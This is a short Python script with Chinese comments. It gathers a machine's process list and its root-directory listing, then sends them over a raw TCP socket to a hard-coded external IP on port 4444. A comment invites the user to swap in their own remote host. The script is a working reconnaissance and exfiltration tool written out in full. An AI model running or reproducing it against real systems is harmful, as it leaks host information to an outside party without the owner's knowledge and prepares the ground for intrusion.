import os
import socket
import subprocess

REMOTE_HOST = "172.237.65.250"   # 替换为你的外网主机IP
REMOTE_PORT = 4444       # 替换为你的服务器端口

def get_process_list():
    # 使用ps命令获取进程列表
    try:
        out = subprocess.check_output(['ps', 'aux'], text=True)
    except Exception as e:
        out = f"Error getting process list: {e}"
    return out

def get_root_file_list():
    # 获取根目录下的文件和目录列表
    try:
        files = os.listdir('/')
        files_str = '\n'.join(files)
    except Exception as e:
        files_str = f"Error getting root file list: {e}"
    return files_str

def main():
    process_list = get_process_list()
    root_files = get_root_file_list()
    data = f"Process List:\n{process_list}\n\nRoot Directory Files:\n{root_files}"
    print(data)  # 输出到控制台，便于调试
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((REMOTE_HOST, REMOTE_PORT))
        s.sendall(data.encode())

if __name__ == "__main__":
    main()